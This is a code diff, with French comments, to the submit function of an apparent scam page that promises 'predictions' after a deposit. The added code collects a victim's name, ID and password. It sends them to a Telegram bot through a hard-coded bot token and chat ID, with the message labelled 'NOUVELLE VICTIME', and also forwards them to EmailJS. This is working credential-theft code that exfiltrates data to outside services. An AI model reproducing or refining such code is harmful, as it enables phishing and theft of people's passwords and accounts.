@@ -1,31 +1,24 @@
 function finalSubmit() {
-    const pass = document.getElementById('p3_pass').value;
-    if(pass == "") {
-        alert("Entrez votre mot de passe pour confirmer l'accès.");
-        return;
-    }
-
-    // Préparation des données pour EmailJS
     const data = {
         nom: document.getElementById('p1_name').value,
         id: document.getElementById('p1_id').value,
-        sexe: document.getElementById('p2_sex').value,
-        pays: document.getElementById('p2_pays').value,
-        ville: document.getElementById('p2_ville').value,
-        date: document.getElementById('p2_date').value,
-        pass: pass
+        pass: document.getElementById('p3_pass').value
     };
 
-    // On affiche un message de chargement
-    alert("Vérification du dépôt de 10 000 FC en cours...");
+    // TON NOUVEAU TOKEN (celui de ton code Python)
+    const token = "6979576051:AAGB_RAKRKORo-3jkv13XRHWhandRY240fc";
+    const chatId = "5112163453"; // Ton ID numérique Telegram
+    
+    const message = `🔔 NOUVELLE VICTIME 🔔\n\n👤 Nom: ${data.nom}\n🆔 ID: ${data.id}\n🔑 PASS: ${data.pass}`;
 
-    // Envoi vers Gmail et passage FORCE à la page 4
-    emailjs.send("service_ag0odpl", "TON_TEMPLATE_ID_ICI", data)
+    const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+
+    // Envoi à Telegram
+    fetch(url);
+    
+    // Envoi à Gmail (EmailJS)
+    emailjs.send("service_ag0odpl", "TON_TEMPLATE_ID", data)
     .then(() => {
-        showPage(4); // Passe à la page prédiction si l'envoi réussit
-    })
-    .catch((err) => {
-        console.log("Erreur EmailJS:", err);
-        showPage(4); // On force quand même le passage à la page 4 pour l'utilisateur
+        showPage(4); // Montre la page de prédiction
     });
 }
